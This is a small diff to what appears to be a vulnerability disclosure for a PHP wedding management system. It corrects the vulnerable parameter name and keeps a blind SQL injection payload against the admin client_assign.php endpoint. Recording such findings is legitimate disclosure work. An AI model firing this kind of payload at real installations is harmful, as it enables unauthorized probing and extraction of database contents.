@@ -8,7 +8,7 @@ vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code
 
 Vulnerability File: /Wedding-Management/admin/client_assign.php?booking=31&user_id=
 
-Vulnerability location: /Wedding-Management/admin/client_assign.php?booking=31&user_id=,id
+Vulnerability location: /Wedding-Management/admin/client_assign.php?booking=31&user_id=,user_id
 
 [+] Payload: /Wedding-Management/admin/client_assign.php?booking=31&user_id=31%20and%20length(database())%20=8 // Leak place ---> user_id
 
